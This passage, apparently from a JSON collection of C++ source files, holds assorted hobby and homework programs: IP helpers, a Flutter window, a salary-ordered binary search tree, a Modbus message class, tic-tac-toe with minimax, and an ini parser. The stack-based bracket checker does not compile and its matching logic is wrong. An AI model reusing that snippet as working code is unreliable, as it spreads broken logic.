0xFF);\r\n\treturn result;\r\n}\r\n\r\nstd::string flagsToString(int flagsi)\r\n{\r\n\tstd::string result;\r\n\tfor (int i = 0; i < 11; i++)\r\n\t\tif (flagsi & (1 << i))\r\n\t\t{\r\n\t\t\tresult += flags[i];\r\n\t\t\tresult += \" - \";\r\n\t\t\tresult += flags_descriptions[i];\r\n\t\t\tresult += \"<br>\";\r\n\t\t}\r\n\treturn result;\r\n}\r\n\r\nstd::string boldIf(std::string text, bool condition)\r\n{\r\n\tif (condition)\r\n\t\treturn \"<b>\" + text + \"</b>\";\r\n\treturn text;\r\n}\r\n\r\nstd::string maskSlash(uint32_t ip)\r\n{\r\n\t// how many ones in the mask\r\n\r\n\tauto total = 0;\r\n\tfor (int i = 0; i < 32; i++)\r\n\t\tif (ip & (1 << i))\r\n\t\t\ttotal++;\r\n\r\n\treturn intToIP(ip) + \"/\" + std::to_string(total);\r\n}\r\n\r\nvoid client(int new_socket)\r\n{\r\n\tchar buffer[1024] = {0};\r\n\tread(new_socket, buffer, 1024);\r\n\tstd::cout << \"Message received: \" << buffer << std::endl;\r\n\t//send(new_socket, ",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "/*\nNames:  Jonah Ebent and Evan Whitmer\nClass:  CSC-344-A   Algorithms and Complexity\nDate:   October 19, 2024\n\nDescription:\nWrite a program in C++ that implements a binary search tree, where at each node\nthere is an object representing an employee\u2019s information within a company (i.e. an\nobject whose member variables are their first and last name, their job title, and their\nsalary). The tree should be organized based on the employees\u2019 salary.\n\nYour program should have the following features:\n\n1.\nA menu asking user whether they want to add an employee, delete an\nemployee, quit the program, or search the \u201cdatabase\u201d for employees who\nfall between a minimum and maximum salary range.\n\n2.\nAn implementation for each of these menu options (I\u2019ll let details up to you).\nAfter the program executes each option (sans \u201cquit\u201d) the program should return\nthe user to the main menu.\n\n3.\nA driver that demonstrates that each function works correctly.\nBe sure to add at least 10000 random \u201cemployees\u201d to the tree in your\ndriver using your \u201cadd\" function, where salary ranges are from 30000 and 200000.\nThen, print the menu for users to choose from.\n\nThe implementation of the BST is a modification of the code found here:\nhttps://gist.github.com/harish-r/a7df7ce576dda35c9660\n*/\n#include <iostream>\n#include <functional>\n#include <random>\n#include <string>\n#include <vector>\n\nusing namespace std;\n\nstruct Employee {\n    Employee() {};\n    Employee(string firstName, string lastName, string jobTitle, int salary) :\n        firstName(firstName),\n        lastName(lastName),\n        jobTitle(jobTitle),\n        salary(salary) {}\n\n    int salary{};\n    string firstName{};\n    string lastName{};\n    string jobTitle{};\n\n    bool operator<(const Employee& other) const {\n        return salary < other.salary;\n    }\n\n    bool operator<=(const Employee& other) const {\n        return salary <= other.salary;\n    }\n\n    bool operator>(const Employee& other) const {\n        return salary > other.salary;\n    }\n\n    bool operator>=(const Employee& other) const {\n        return salary >= other.salary;\n    }\n    \n    bool operator==(const Employee& other) const {\n        return salary == other.salary\n            && firstName == other.firstName\n            && lastName == other.lastName\n            && jobTitle == other.jobTitle;\n    }\n\n    bool operator!=(const Employee& other) const {\n        return !(*this == other);\n    }\n\n    friend ostream& operator<<(ostream& os, const Employee& obj) {\n        os << obj.firstName << \" \" << obj.lastName << \", \" << obj.jobTitle << \" ($\" << obj.salary << \")\";\n        return os;\n    }\n};\n\nclass EmployeeBST {\n\n    struct node {\n        node(Employee data) : data(data), left(nullptr), right(nullptr) {}\n\n        Employee data;\n        node* left;\n        node* right;\n    };\n\n    node* root;\n\n    node* makeEmpty(node* t) {\n        if (t == nullptr)\n            return nullptr;\n        {\n            makeEmpty(t->left);\n            makeEmpty(t->right);\n            delete t;\n        }\n        return nullptr;\n    }\n\n    node* insert(Employee x, node* t) {\n        if (t == nullptr) {\n            t = new node(x);\n        }\n        else if (x < t->data) {\n            t->left = insert(x, t->left);\n        }\n        else {\n            t->right = insert(x, t->right);\n        }\n        return t;\n    }\n\n    node* findMin(node* t) {\n        if (t == nullptr) return nullptr;\n        else if (t->left == nullptr) return t;\n        else return findMin(t->left);\n    }\n\n    node* findMax(node* t) {\n        if (t == nullptr) return nullptr;\n        else if (t->right == nullptr) return t;\n        else return findMax(t->right);\n    }\n\n    node* remove(Employee x, node* t) {\n        node* temp;\n        if (t == nullptr) return nullptr;\n        else if (x != t->data) { // traverse down the tree\n            if (x < t->data) {\n                t->left = remove(x, t->left);\n            }\n            else if (x > t->data) {\n                t->right = remove(x, t->right);\n            }\n        }\n        // found a node with the same salary\n        else if (t->left && t->right) {         // if it has two children\n            temp = findMin(t->right);\n            t->data = temp->data;\n            t->right = remove(t->data, t->right);\n        }\n        else {                                  // if it has one\n            temp = t;\n            if (t->left == nullptr) {\n                t = t->right;\n            }\n            else if (t->right == nullptr) {\n                t = t->left;\n            }\n            delete temp;\n        }\n\n        return t;\n    }\n\n    void inorder(node* t) {\n        if (t == nullptr)\n            return;\n        inorder(t->left);\n        cout << t->data << endl;\n        inorder(t->right);\n    }\n\n    void inorderConditional(node* t, function<bool(node *)> condition) {\n        if (t == nullptr) return;\n        inorderConditional(t->left, condition);\n        if (condition(t)) cout << t->data << endl;\n        inorderConditional(t->right, conditi",
    "#include<iostream>\r\nusing namespace std;\r\ntemplate<typename T>\r\nclass Stack\r\n{\r\n\tT* stack;\r\n\tint capacity;\r\n\tint top;\r\npublic:\r\n\tStack(int cap)\r\n\t{\r\n\t\tif (cap <= 0)\r\n\t\t{\r\n\t\t\tcout << \"Capacity should be greater than 0\";\r\n\t\t\tcapacity = 0;\r\n\t\t\tstack = nullptr;\r\n\t\t\ttop = -1;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tcapacity = cap;\r\n\t\t\tstack = new T[capacity];\r\n\t\t\ttop = -1;\r\n\t\t}\r\n\t}\r\n\tbool isEmpty()\r\n\t{\r\n\t\tif (top == -1)\r\n\t\t{\r\n\t\t\treturn true;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\treturn false;\r\n\t\t}\r\n\t}\r\n\tbool isFull()\r\n\t{\r\n\t\tif (top == capacity - 1)\r\n\t\t{\r\n\t\t\treturn true;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\treturn false;\r\n\t\t}\r\n\t}\r\n\tvoid push(T element)\r\n\t{\r\n\t\tif (!isFull())\r\n\t\t{\r\n\t\t\ttop = top + 1;\r\n\t\t\tstack[top] = element;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tcout << \"The stack is Full\";\r\n\t\t}\r\n\t}\r\n\tT pop()\r\n\t{\r\n\t\tT val = -11111;\r\n\t\tif (!isEmpty())\r\n\t\t{\r\n\t\t\tval = stack[top];\r\n\t\t\ttop = top - 1;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tcout << \"The stack is Empty\";\r\n\t\t}\r\n\t\treturn val;\r\n\t}\r\n\tT peek()\r\n\t{\r\n\t\tT val = -11111;\r\n\t\tif (!isEmpty())\r\n\t\t{\r\n\t\t\tval = stack[top];\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tcout << \"The stack is Empty\";\r\n\t\t}\r\n\t\treturn val;\r\n\t}\r\n\tT size()\r\n\t{\r\n\t\treturn top + 1;\r\n\t}\r\n};\r\nbool isBalanced(string exp)\r\n{\r\n\tint len = exp.length();\r\n\tStack<char> k{ len };\r\n\tchar r;\r\n\tint i = 0;\r\n\twhile (len>0)\r\n\t{\r\n\t\tif (exp[i] == '[' || exp[i] == '(' || exp[i] == '{')\r\n\t\t{\r\n\t\t\tk.push(exp[i]);\r\n\t\t}\r\n\t\telse if (exp[i] == ']' || exp[i] == ')' || exp[i] == '}')\r\n\t\t{\r\n\t\t\tif (exp[i] == ')' && k.pop()!='('&& exp[i] == '}' && k.pop() != '{' && exp[i] == ']' && k.pop() != '[')\r\n\t\t\t{\r\n\t\t\t\treturn false;\r\n\t\t\t}\r\n\t\t}\r\n\t\ti++;\r\n\t\tlen--;\r\n\t}\r\n\tif(k.isEmpty()\r\n\t{\r\n\treturn true;\r\n\t}\r\n\telse \r\n\t{\r\n\treturn false;\r\n }\r\nint main()\r\n{\r\n\tstring s{ \"((()())\" };\r\n\tcout << isBalanced(s);\r\n}\r\n",
    "#include <message.h>\n#include <byteUtils.h>\n\nMessage::Message(byte type, byte* data, int dataLen): type(type), data(data), dataLength(dataLen) {\n  contentLength = sizeof(contentLength) + sizeof(type) + dataLen + CHECKSUM_SIZE;\n  content = new byte[contentLength]();\n  content[0] = contentLength;\n  content[1] = type;\n  for (int i = 0; i < dataLen; i++) {\n    content[2 + i] = data[i];\n  }\n\n  std::array<byte, CHECKSUM_SIZE> modbus = ModRTU_CRC(content, contentLength - CHECKSUM_SIZE);\n  for (int i = 0; i < CHECKSUM_SIZE; i++) {\n    content[contentLength - CHECKSUM_SIZE + i] = modbus.at(i);\n  }\n}\n\nMessage::~Message() {\n  delete[] content;\n}\n\nint Message::getLength() {\n  return sizeof(START) + contentLength + sizeof(END);\n}\n\nvoid Message::writeBytes(byte* bytes) {\n  bytes[0] = START;\n  for (int i = 0; i < contentLength; i++) {\n    bytes[1 + i] = content[i];\n  }\n  bytes[contentLength + 1] = END;\n}\n\nboolean Message::hasChecksum(byte* checksum) {\n  for (int i = 0; i < CHECKSUM_SIZE; i++) {\n    if (content[contentLength - CHECKSUM_SIZE + i] != checksum[i]) {\n      return false;\n    }\n  }\n  return true;\n}\n\nString Message::toString() {\n  String str = formatBytes(content, contentLength);\n  return str;\n}\n\nboolean Message::operator==(const Message &other) const {\n  if (type != other.type) {\n    return false;\n  }\n  if (dataLength != other.dataLength) {\n    return false;\n  }\n  for (int i = 0; i < dataLength; i++) {\n    if (data[i] != other.data[i]) {\n      return false;\n    }\n  }\n  return true;\n}\n\nboolean Message::operator!=(const Message &other) const {\n  return !(*this == other);\n}",
    "\ufeff#include <iostream>\n#include <windows.h>\n\nusing namespace std;\n\n\nclass smart_array\n{\npublic: \n    int len;\n    int nowLen;\n    int* arr;\n\n    smart_array(int len)\n    {\n        this->len = len;\n        nowLen = 0;\n        arr = new int[len]();\n    }\n\n    /*void expansione_array(int* arr)\n    {\n        len *= 2;\n\n        int* array = new int[len]();\n\n        for (int i = 0; i < sizeof(arr)/sizeof(arr[0]); i++)\n        {\n            array[i] = arr[i];\n        }\n\n        delete[] arr;\n        arr = new int[len]();\n\n        for (int i = 0; i < len; i++)\n        {\n            arr[i] = array[i];\n        }\n\n        delete[] array;\n    }*/\n\n    int* expansione_array(static int* arr)\n    {\n        len *= 2;\n\n        int* array = new int[len]();\n\n        for (int i = 0; i < (len / 2); i++)\n        {\n            array[i] = arr[i];\n        }\n\n        delete[] arr;\n\n        return array;\n    }\n\n    void add_element(int number)\n    {\n        if (len == nowLen)\n        {\n            arr = expansione_array(arr);\n        }\n\n        arr[nowLen] = number;\n        nowLen += 1;\n    }\n\n\n    int get_element(int number)\n    {\n        if (nowLen > number)\n        {\n            return arr[number];\n        }\n        throw runtime_error(\"\u0422\u0430\u043a\u043e\u0433\u043e \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430 \u043c\u0430\u0441\u0441\u0438\u0432\u0430 \u0435\u0449\u0435 \u043d\u0435 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442!\");\n\n        return 0;\n    }\n\n    void now_length()\n    {\n        cout << nowLen;\n    }\n\n    void length()\n    {\n        cout << len;\n    }\n\n    ~smart_array()\n    {\n        delete[] arr;\n    }\n};\n\nint main()\n{\n    SetConsoleCP(1251);\n    SetConsoleOutputCP(1251);\n\n    try {\n        smart_array arr(3);\n        arr.add_element(1);\n        arr.add_element(4);\n        arr.add_element(155);\n        arr.add_element(14);\n        arr.add_element(15);\n        arr.add_element(999);\n        std::cout << arr.get_element(5) << std::endl;\n    }\n    catch (const exception& ex) {\n        cout << ex.what() << endl;\n    }\n\n    return 0;\n}",
    "#include <iostream>\r\n#include <cctype> //tolower()\r\n#include <cstdbool> //bool; true; false\r\n\r\nusing namespace std;\r\n//function declaration\r\nbool want_to_repeat();\r\ndouble c2f(double c);\r\ndouble f2c(double f);\r\n\r\nint main()\r\n{\r\n\tcout << \"Welcome to cf1\" << endl;\r\n\r\n\twhile (true)\r\n\t{\r\n\t\tcout << \"Enter a temp value followed by F or C: \";\r\n\t\tdouble temp = 0, ctemp = 0, ftemp = 0;\r\n\t\tchar cf = ' ';\r\n\t\tcin >> temp >> cf;\r\n\t\tcf = tolower(cf);\r\n\t\tif (cf == 'c')\r\n\t\t{\r\n\t\t\tctemp = temp;\r\n\t\t\tftemp = c2f(temp);\r\n\t\t}\r\n\t\telse if (cf == 'f')\r\n\t\t{\r\n\t\t\tftemp = temp;\r\n\t\t\tctemp = f2c(temp);\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tcout << \"invlaid char; use c or f\" << endl;\r\n\t\t\tcontinue; //back to the beginning of while\r\n\t\t}\r\n\r\n\t\tcout << \"temp \" << ctemp << char(248) <<\r\n\t\t\t\"C = \" << ftemp << char(248) << \"F\" << endl;\r\n\t\tconst char ds = char(248);\r\n\t\tcout << \"temp \" << ctemp << ds <<\r\n\t\t\t\"C = \" << ftemp << ds << \"F\" << endl;\r\n\t\t//=====\r\n\t\tif (!want_to_repeat())\r\n\t\t\tbreak; //exit the while loop\r\n\t}\r\n\r\n\treturn 0;\r\n}\r\n\r\n//function definition\r\nbool want_to_repeat()\r\n{\r\n\tchar answer = ' ';\r\n\twhile (true)\r\n\t{\r\n\t\tcout << \"Do you want to repeat (y or n)? \";\r\n\r\n\t\tcin >> answer;\r\n\t\tanswer = tolower(answer);\r\n\t\tif (answer == 'y' || answer == 'n')\r\n\t\t\tbreak;\r\n\t\tcout << \"wrong input \" << endl;\r\n\t}\r\n\treturn (answer == 'y');\r\n}\r\n\r\ndouble c2f(double c)\r\n{\r\n\tdouble f = c * 9 / 5 + 32;\r\n\treturn f;\r\n\t//return c * 9 / 5 + 32;\r\n}\r\n\r\ndouble f2c(double f)\r\n{\r\n\tdouble c = (f - 32) * 5 / 9;\r\n\treturn c;\r\n\t//return (f - 32) * 5 / 9;\r\n}\r\n",
    "#include <iostream>\n#include <array>\n#include <SFML/Graphics.hpp>\n#include <vector>\n#include <limits>\n\nint playerTurn = 0;  // 0 for player, 1 for AI\nstd::string result;\n\n\nstd::array<std::array<char, 3>, 3> board = {{\n    {' ', ' ', ' '},\n    {' ', ' ', ' '},\n    {' ', ' ', ' '}\n}};\n\n\nint evaluate_position(const std::array<std::array<char, 3>, 3>& board) {\n\n    for (int i = 0; i < 3; ++i) {\n        if (board[i][0] == board[i][1] && board[i][1] == board[i][2]) {\n            if (board[i][0] == 'X') return -1;  // Player win\n            if (board[i][0] == 'O') return 1;   // AI win\n        }\n        if (board[0][i] == board[1][i] && board[1][i] == board[2][i]) {\n            if (board[0][i] == 'X') return -1;\n            if (board[0][i] == 'O') return 1;\n        }\n    }\n\n    if (board[0][0] == board[1][1] && board[1][1] == board[2][2]) {\n        if (board[0][0] == 'X') return -1;\n        if (board[0][0] == 'O') return 1;\n    }\n    if (board[0][2] == board[1][1] && board[1][1] == board[2][0]) {\n        if (board[0][2] == 'X') return -1;\n        if (board[0][2] == 'O') return 1;\n    }\n\n    return 0;\n}\n\nstd::vector<std::array<int, 2>> gen_moves(const std::array<std::array<char, 3>, 3>& board) {\n    std::vector<std::array<int, 2>> moves;\n    for (int i = 0; i < 3; ++i) {\n        for (int j = 0; j < 3; ++j) {\n            if (board[i][j] == ' ') {\n                moves.push_back({i, j});\n            }\n        }\n    }\n    return moves;\n}\n\nint minimax(std::array<std::array<char, 3>, 3>& board, bool maximizing_player) {\n    int score = evaluate_position(board);\n    if (score == 1 || score == -1 || gen_moves(board).empty()) {\n        return score;\n    }\n\n    if (maximizing_player) {\n        int maxEval = std::numeric_limits<int>::min();\n        for (const auto& move : gen_moves(board)) {\n            board[move[0]][move[1]] = 'O';\n            int eval = minimax(board, false);\n            board[move[0]][move[1]] = ' ';  // Undo move\n            maxEval = std::max(maxEval, eval);\n        }\n        return maxEval;\n    } else {\n        int minEval = std::numeric_limits<int>::max();\n        for (const auto& move : gen_moves(board)) {\n            board[move[0]][move[1]] = 'X';\n            int eval = minimax(board, true);\n            board[move[0]][move[1]] = ' ';\n            minEval = std::min(minEval, eval);\n        }\n        return minEval;\n    }\n}\n\nvoid make_computer_move(std::array<std::array<char, 3>, 3>& board) {\n    auto possibleMoves = gen_moves(board);\n    if (possibleMoves.empty()) return;\n\n    int bestEval = std::numeric_limits<int>::min();\n    std::array<int, 2> bestMove = {-1, -1};\n\n    for (const auto& move : possibleMoves) {\n        board[move[0]][move[1]] = 'O';\n        int eval = minimax(board, false);\n        board[move[0]][move[1]] = ' ';\n\n        if (eval > bestEval) {\n            bestEval = eval;\n            bestMove = move;\n        }\n    }\n\n\n    if (bestMove[0] != -1 && bestMove[1] != -1) {\n        board[bestMove[0]][bestMove[1]] = 'O';\n    }\n}\n\n\nvoid handle_click(sf::RenderWindow& window) {\n    sf::Vector2i mousePos = sf::Mouse::getPosition(window);\n    const int cellSize = 100;\n    int row = mousePos.y / cellSize;\n    int col = mousePos.x / cellSize;\n\n    if (row >= 0 && row < 3 && col >= 0 && col < 3) {\n\n        if (board[row][col] == ' ') {\n            board[row][col] = 'X';\n            playerTurn = 1;\n        }\n    }\n}\n\n\nvoid draw_board(sf::RenderWindow& window) {\n    const int cellSize = 100;\n    const sf::Color lineColor = sf::Color::Black;\n\n\n    sf::RectangleShape verticalLine(sf::Vector2f(2.f, 3 * cellSize));\n    verticalLine.setFillColor(lineColor);\n    sf::RectangleShape horizontalLine(sf::Vector2f(3 * cellSize, 2.f));\n    horizontalLine.setFillColor(lineColor);\n\n    for (int i = 1; i < 3; ++i) {\n        verticalLine.setPosition(i * cellSize, 0);\n        window.draw(verticalLine);\n        horizontalLine.setPosition(0, i * cellSize);\n        window.draw(horizontalLine);\n    }\n\n\n    sf::Font font;\n    if (!font.loadFromFile(\"/System/Library/Fonts/Supplemental/Arial.ttf\")) {\n        std::cerr << \"Failed to load font!\" << std::endl;\n        return;\n    }\n\n    for (int row = 0; row < 3; ++row) {\n        for (int col = 0; col < 3; ++col) {\n            sf::Text cellText;\n            cellText.setFont(font);\n            cellText.setCharacterSize(72);\n            cellText.setFillColor(sf::Color::Black);\n            cellText.setString(board[row][col]);\n            cellText.setPosition(col * cellSize + cellSize / 4, row * cellSize);\n            window.draw(cellText);\n        }\n    }\n}\n\n\nbool gameOver(const std::array<std::array<char, 3>, 3>& board, std::string& result) {\n\n    for (int i = 0; i < 3; ++i) {\n        if (board[i][0] == board[i][1] && board[i][1] == board[i][2] && board[i][0] != ' ') {\n            result = (board[i][0] == 'X') ? \"Player wins!\" : \"AI wins!\";\n            return true;\n        }\n        if (board[0][i] == board[1][i] && board[1][i] == board[2][i] && board[0][i] != ' ') {\n           ",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <string>\n#include <map>\n#include <vector>\n#include <tuple> // Para retornar m\u00faltiplos valores\n\n// Fun\u00e7\u00e3o para ler o arquivo e preencher o mapa e o vetor\nstd::tuple<std::map<std::string, int>, std::vector<std::string>> lerArquivoParaMapEVetor(const std::string& nomeArquivo) {\n    std::map<std::string, int> mapa;\n    std::vector<std::string> vetor;\n    std::ifstream arquivo(nomeArquivo);\n    std::string linha;\n\n    while (std::getline(arquivo, linha)) {\n        std::stringstream ss(linha);\n        std::string indice_str, nome;\n        \n        while (std::getline(ss, indice_str, ',') && std::getline(ss, nome)) {\n            int indice = std::stoi(indice_str);\n            mapa[nome] = indice;\n            if (indice >= vetor.size()) {\n                vetor.resize(indice + 1);\n            }\n            vetor[indice] = nome;\n        }\n    }\n\n    return {mapa, vetor};\n}\n\nint main() {\n    std::string nomeArquivo = \"rede_colaboracao_vertices.txt\";\n    auto [mapa, vetor] = lerArquivoParaMapEVetor(nomeArquivo);\n    int indiceDesejado = 2;\n    std::cout << mapa[\"Alan M. Turing\"];\n    std::cout << vetor[11365];\n\n    return 0;\n}\n\n//g++ -O3 -o a.exe map.cpp\n//./a.exe",
    "\ufeff#include \"ini_parser.h\"\n#include <fstream>\n#include <string>\n\n\nini_parser::ini_parser()\n{\t\n\t//\u043c\u0430\u0441\u0441\u0438\u0432\u044b \u0434\u043b\u044f \u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u0438\u043c\u0435\u043d \u0441\u0435\u043a\u0446\u0438\u0439 \u0438 \u0438\u0445 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0445\n\tvariables_str_array = new std::vector<std::map<std::string, std::string>>; //\u043c\u0430\u0441\u0441\u0438\u0432\u043e\u043c \u043c\u0430\u043f\u043e\u0432, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u0441\u043e\u0434\u0435\u0440\u0436\u0430\u0442 \u0441\u0442\u0440\u043e\u043a\u0438\n\tsections_map = new std::map<std::string, int>; //\u0441\u043e\u043e\u0442\u0432\u0435\u0442\u0441\u0442\u0432\u0438\u0435 \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u044f \u0441\u0435\u043a\u0446\u0438\u0438 \u043d\u043e\u043c\u0435\u0440\u0443 \u043c\u0430\u0441\u0441\u0438\u0432\u0430 variables_str_array\n\n\t//\u0435\u0441\u043b\u0438 \u0431\u044b\u043b\u0438 \u043f\u0440\u043e\u0431\u043b\u0435\u043c\u044b \u043f\u0440\u0438 \u0432\u044b\u0437\u043e\u0432\u0430\u0445 new\n\tif ((variables_str_array == nullptr) || (sections_map == nullptr))\n\t{\n\t\tparser_invalid = true; //\u0435\u0441\u0442\u044c \u043f\u0440\u043e\u0431\u043b\u0435\u043c\u044b \u0441 \u043f\u0430\u0440\u0441\u0435\u0440\u043e\u043c\n\t\treturn;\n\t}\n}\n\nini_parser::~ini_parser()\n{\n\tdelete variables_str_array;\n\tdelete sections_map;\n}\n\nini_parser::ini_parser(const ini_parser& other) // \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u043a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f\n{\n\tparser_invalid = other.parser_invalid; //\u0435\u0441\u0442\u044c \u043b\u0438 \u043f\u0440\u043e\u0431\u043b\u0435\u043c\u044b \u0441 \u043f\u0430\u0440\u0441\u0435\u0440\u043e\u043c\n\tfile_read = other.file_read;  //\u0445\u0440\u0430\u043d\u0438\u0442 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044e \u043e \u0442\u043e\u043c, \u0443\u0434\u0430\u043b\u043e\u0441\u044c \u043b\u0438 \u0441\u0447\u0438\u0442\u0430\u0442\u044c \u0434\u0430\u043d\u043d\u044b\u0435 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430\n\tinvalid_data = other.invalid_data; //\u0445\u0440\u0430\u043d\u0438\u0442 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044e, \u0435\u0441\u0442\u044c \u043b\u0438 \u0432 \u0444\u0430\u0439\u043b\u0435 \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u0430\u044f \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044f\n\tincorrect_str_num = other.incorrect_str_num;  //\u043d\u043e\u043c\u0435\u0440 \u0441\u0442\u0440\u043e\u043a\u0438, \u0441\u043e\u0434\u0435\u0440\u0436\u0430\u0449\u0435\u0439 \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u044b\u0439 \u0441\u0438\u043d\u0442\u0430\u043a\u0441\u0438\u0441\n\tincorrect_str = other.incorrect_str;  //\u0441\u043e\u0434\u0435\u0440\u0436\u0438\u043c\u043e\u0435 \u0441\u0442\u0440\u043e\u043a\u0438 \u0441 \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u044b\u043c \u0441\u0438\u043d\u0442\u0430\u043a\u0441\u0438\u0441\u043e\u043c\n\n\t//\u0442\u0435\u043a\u0443\u0449\u0430\u044f \u0441\u0435\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0445\n\tcurrent_section_name = other.current_section_name; //\u0438\u043c\u044f \u0441\u0435\u043a\u0446\u0438\u0438\n\tcurrent_section_number = other.current_section_number; //\u043d\u043e\u043c\u0435\u0440 \u0441\u0435\u043a\u0446\u0438\u0438 = \u0438\u043d\u0434\u0435\u043a\u0441  \u044d\u0442\u043e\u0439 \u0441\u0435\u043a\u0446\u0438\u0438 \u0432 \u043c\u0430\u0441\u0441\u0438\u0432\u0435 variables_str_array\n\n\tsections_map = new std::map<std::string, int>;\n\t*sections_map = *(other.sections_map); // new std::map<std::string, int>; //\u0441\u043e\u043e\u0442\u0432\u0435\u0442\u0441\u0442\u0432\u0438\u0435 \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u044f \u0441\u0435\u043a\u0446\u0438\u0438 \u043d\u043e\u043c\u0435\u0440\u0443 \u043c\u0430\u0441\u0441\u0438\u0432\u0430 variables_str_array\n\n\tvariables_str_array = new std::vector<std::map<std::string, std::string>>; //\u043c\u0430\u0441\u0441\u0438\u0432\u043e\u043c \u043c\u0430\u043f\u043e\u0432, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u0441\u043e\u0434\u0435\u0440\u0436\u0430\u0442 \u0441\u0442\u0440\u043e\u043a\u0438 (\u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0445 \u0438 \u0438\u0445 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f)\n\n\tfor (int i = 0; i < other.variables_str_array->size(); ++i)\n\t{\n\t\tvariables_str_array->push_back((*other.variables_str_array)[i]); //  \u0441\u043a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u0442\u044c map \u0432 \u043d\u043e\u0432\u044b\u0439 \u043c\u0430\u0441\u0441\u0438\u0432\n\t}\n}\n\nini_parser& ini_parser::operator=(const ini_parser& other) // \u043e\u043f\u0435\u0440\u0430\u0442\u043e\u0440 \u043a\u043e\u043f\u0438\u0440\u0443\u044e\u0449\u0435\u0433\u043e \u043f\u0440\u0438\u0441\u0432\u0430\u0438\u0432\u0430\u043d\u0438\u044f\n{\n\tif (this != &other)\n\t{\n\t\treturn *this = ini_parser(other);\n\t}\n\n\treturn *this;\n}\n\nini_parser::ini_parser(ini_parser&& other) noexcept\t// \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u043f\u0435\u0440\u0435\u043c\u0435\u0449\u0435\u043d\u0438\u044f\n{\n\tparser_invalid = other.parser_invalid; //\u0435\u0441\u0442\u044c \u043b\u0438 \u043f\u0440\u043e\u0431\u043b\u0435\u043c\u044b \u0441 \u043f\u0430\u0440\u0441\u0435\u0440\u043e\u043c\n\tfile_read = other.file_read;  //\u0445\u0440\u0430\u043d\u0438\u0442 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044e \u043e \u0442\u043e\u043c, \u0443\u0434\u0430\u043b\u043e\u0441\u044c \u043b\u0438 \u0441\u0447\u0438\u0442\u0430\u0442\u044c \u0434\u0430\u043d\u043d\u044b\u0435 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430\n\tinvalid_data = other.invalid_data; //\u0445\u0440\u0430\u043d\u0438\u0442 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044e, \u0435\u0441\u0442\u044c \u043b\u0438 \u0432 \u0444\u0430\u0439\u043b\u0435 \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u0430\u044f \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044f\n\tincorrect_str_num = other.incorrect_str_num;  //\u043d\u043e\u043c\u0435\u0440 \u0441\u0442\u0440\u043e\u043a\u0438, \u0441\u043e\u0434\u0435\u0440\u0436\u0430\u0449\u0435\u0439 